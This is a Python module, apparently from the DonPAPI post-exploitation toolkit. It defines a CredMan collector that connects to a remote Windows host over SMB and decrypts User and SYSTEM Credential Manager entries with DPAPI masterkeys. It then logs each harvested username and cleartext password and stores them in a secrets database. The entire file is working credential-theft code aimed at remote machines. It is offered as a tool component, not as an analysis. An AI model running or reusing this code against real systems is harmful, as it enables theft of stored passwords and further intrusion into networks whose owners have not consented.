from typing import Any

from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection
from dploot.triage.credentials import CredentialsTriage
from donpapi.core import DonPAPICore
from donpapi.lib.logger import DonPAPIAdapter


class CredMan:
    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list, options: Any, logger: DonPAPIAdapter, context: DonPAPICore, false_positive: list, max_filesize: int) -> None:
        self.tag = self.__class__.__name__
        self.target = target
        self.conn = conn
        self.masterkeys = masterkeys
        self.options = options
        self.logger = logger
        self.context = context
        self.false_positive = false_positive
        self.max_filesize = max_filesize

    def run(self):
        self.logger.display(f"Dumping User{' and Machine' if self.context.remoteops_allowed else ''} Credential Manager")
        credentials_triage = CredentialsTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys)
        credentials = credentials_triage.triage_credentials()
        for credential in credentials:
            self.logger.secret(f"[{credential.winuser}] {credential.target} - {credential.username}:{credential.password}", self.tag)
            self.context.db.add_secret(computer=self.context.host, collector=self.tag, windows_user=credential.winuser, username=credential.username.rstrip("\x00"), password=credential.password.rstrip("\x00"), target=credential.target.rstrip("\x00"))
        if self.context.remoteops_allowed:
            system_credentials = credentials_triage.triage_system_credentials()
            for credential in system_credentials:
                self.logger.secret(f"[SYSTEM] {credential.target} - {credential.username}:{credential.password}", self.tag)
                self.context.db.add_secret(computer=self.context.host, collector=self.tag, windows_user="SYSTEM", username=credential.username.rstrip("\x00"), password=credential.password.rstrip("\x00"), target=credential.target.rstrip("\x00"))